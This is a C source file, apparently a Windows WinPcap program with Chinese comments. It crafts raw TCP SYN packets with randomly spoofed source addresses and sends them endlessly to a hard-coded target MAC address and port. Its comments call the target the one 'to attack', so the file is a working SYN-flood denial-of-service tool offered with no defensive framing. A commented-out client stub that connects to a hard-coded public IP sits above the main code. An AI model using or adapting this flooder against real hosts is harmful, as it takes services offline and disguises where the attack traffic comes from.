//#include "../../../common/platform.h"
//#include "../../../common/test_msg_define.h"
//#include "../../../common/network_define.h"
//#include "../../../common/network_center.h"
//#include "../../../common/message_center.h"
//#include "../../../common/command_line.h"
//#include "../../../common/log.h"
//
//
//int main(int argc, char **argv)
//{
//
//	{
//		network::CommandLineParse cmd_line;
//		cmd_line.Parse(argc, argv);
//
//		mylog::SimpleLog log(mylog::EnumLogLevel::E_DEB_LV);
//
//		network::MessageCenter msg_center(network::EnumAppProto::ENUM_BUFF);
//
//		network::NetWorkCenter net;
//
//		if (!g_network_center->Init((int)network::EnumPoller::SELECT_POLLER))
//		{
//			return 0;
//		}
//		int sock = g_network_center->CreateTcpConnectionClient2Server("182.92.89.99", g_CmdLine->Port());
//		if (sock == 0)
//		{
//			return 0;
//		}
//
//		while (true)
//		{
//			net.Run();
//		}
//	}
//
//	return 0;
//}


#include <stdlib.h>
#include <stdio.h>
#include <pcap.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <stdio.h>
#include <wtypes.h>
#pragma comment(lib,"ws2_32.lib")

#define SEQ 0x12121212
#define PCAP_ERRBUF_SIZE 256

typedef struct et_header

{
	unsigned char eh_dst[6]; //目的地址
	unsigned char eh_src[6]; //源地址
	unsigned short eh_type; //eh_type的值需要考察上一层的协议，如果为ip则为0×0800
}ET_HEADER;

//IPv4包头结构体
typedef struct ip_header {
	unsigned char ver_ihl;          //Version (4 bits) + Internet header length (4 bits)
	unsigned char tos;              //Type of service
	unsigned short tlen;            //Total length
	unsigned short identification;  //Identification
	unsigned short flags_fo;        //Flags (3 bits) + Fragment offset (13 bits)
	unsigned char ttl;              //Time to live
	unsigned char proto;            //Protocol
	unsigned short crc;             //Header checksum
	unsigned long ip_src;               //Source address
	unsigned long ip_dst;               //Destination address
}IPHEADER, *PIPHEADER;
//TCP包头结构体
typedef struct tcp_header {
	WORD SourPort;    //源端口号　　
	WORD DestPort;    //目的端口号
	DWORD SeqNo;      //序号
	DWORD AckNo;      //确认序号
	BYTE HLen;        //首部长度（保留位）
	BYTE Flag;        //标识（保留位）
	WORD Window;      //窗口大小
	WORD ChkSum;      //校验和
	WORD UrgPtr;      //紧急指针
}TCPHEADER, *PTCPHEADER;
//定义TCP伪首部 注意：TCP与UDP有相同的伪头部结构
typedef struct _psdhdr {
	unsigned int saddr;          //源地址
	unsigned int daddr;          //目的地址 
	CHAR mbz;
	CHAR ptcl;                   //协议类型
	USHORT tcpl;                 //TCP长度
}PSDHEADER, *PPSDHEADER;

void InitPackageHeader(u_char*);
inline USHORT checksum(USHORT *buffer, int size);

void main()
{
	pcap_t *fp;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[100];
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i = 0;
	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}
	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);
	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return;
	}
	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);
	/* 打开输出设备 */
	if ((fp = pcap_open_live(d->name,	// name of the device
		100,			// portion of the packet to capture. 
						// 65536 grants that the whole packet will be captured on all the MACs.
		1,				// promiscuous mode (nonzero means promiscuous)
		1000,			// read timeout
		errbuf			// error buffer
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		return;
	}
	/* 要攻击的目的MAC地址，可用ipconfig/all查询 */
	packet[0] = 0x00;
	packet[1] = 0x0A;
	packet[2] = 0x18;
	packet[3] = 0x16;
	packet[4] = 0x14;
	packet[5] = 0x34;
	/* 设置MAC源地址为 2:2:2:2:2:2 */
	packet[6] = 2;
	packet[7] = 2;
	packet[8] = 2;
	packet[9] = 2;
	packet[10] = 2;
	packet[11] = 2;
	/*协议类型为以太网*/
	packet[12] = 0x08;
	packet[13] = 0x00;

	/* 填充剩下的内容 ，以太帧头的长度是14个字节，数据部分46-1500个字节，这里采用最短的46字节，所以以太帧的帧尾部分是从第63个字节开始*/
	//CRC冗余校验码不用计算，乱填就行
	//官方文档：The MAC CRC doesn't need to be included, because it is transparently calculated and added by the network interface driver. 
	for (i = 62; i < 100; i++)
	{
		packet[i] = i % 256;
	}

	/* 发送数据包 */
	while (1)
	{
		InitPackageHeader(packet + 14);//填充IP数据包的部分
									   //   memcpy(packet+14,tmpBuf,sizeof(tmpBuf));
		if (pcap_sendpacket(fp, packet, 100 /* size */) != 0)
		{
			fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
			return;
		}
		printf("已攻击\n");
	}

	return;
}

void InitPackageHeader(u_char *tmpBuf) {
	IPHEADER ip_header;
	TCPHEADER tcp_header;
	PSDHEADER psd_header;
	int ipsz, tcpsz, psdsz, itsz, ptsz;

	ipsz = sizeof(IPHEADER);
	tcpsz = sizeof(TCPHEADER);
	psdsz = sizeof(PSDHEADER);
	ptsz = psdsz + tcpsz;
	itsz = ipsz + tcpsz;

	//初始化IP头部
	ip_header.ver_ihl = (4 << 4 | sizeof(ip_header) / sizeof(ULONG));
	/*区分字节部分一般不起作用*/
	ip_header.tlen = htons(sizeof(ip_header) + sizeof(TCPHEADER));
	ip_header.identification = 1;
	ip_header.flags_fo = 0x40;//???
	ip_header.ttl = 128;
	ip_header.proto = IPPROTO_TCP;
	ip_header.crc = 0;
	ip_header.ip_src = rand();
	ip_header.ip_dst = inet_addr("127.0.0.1");

	//初始化TCP头部
	tcp_header.SourPort = htons(rand() % 16383 + 49152);
	tcp_header.DestPort = htons(5000);
	tcp_header.SeqNo = htonl(rand() % 90000000 + 2345);
	tcp_header.AckNo = 0;
	tcp_header.HLen = (sizeof(TCPHEADER) / 4 << 4 | 0);
	tcp_header.Flag = 0x02;
	tcp_header.UrgPtr = 0;
	tcp_header.ChkSum = 0;
	tcp_header.Window = htons(2048);

	//初始化TCP伪头部
	psd_header.saddr = ip_header.ip_src;
	psd_header.daddr = ip_header.ip_dst;
	psd_header.mbz = 0;
	psd_header.ptcl = IPPROTO_TCP;
	psd_header.tcpl = htons(sizeof(TCPHEADER));
	//填充IP首部和TCP首部的校验和部分
	memcpy(tmpBuf, &psd_header, psdsz);
	memcpy(tmpBuf + psdsz, &tcp_header, tcpsz);
	tcp_header.ChkSum = checksum((USHORT*)tmpBuf, ptsz);/*将TCP首部和TCP伪首部加在一起算TCP首部校验和*/
	memset(tmpBuf, 0, ptsz);//清空temBuf
	memcpy(tmpBuf, &ip_header, ipsz);//将IP包首部放入temBuf，计算校验和
	ip_header.crc = checksum((USHORT*)tmpBuf, ipsz);
	memcpy(tmpBuf, &ip_header, ipsz);//放入IP首部
	memcpy(tmpBuf + ipsz, &tcp_header, tcpsz);//放入TCP首部
}

//计算校验和
inline USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while (size > 1) {
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size) {
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}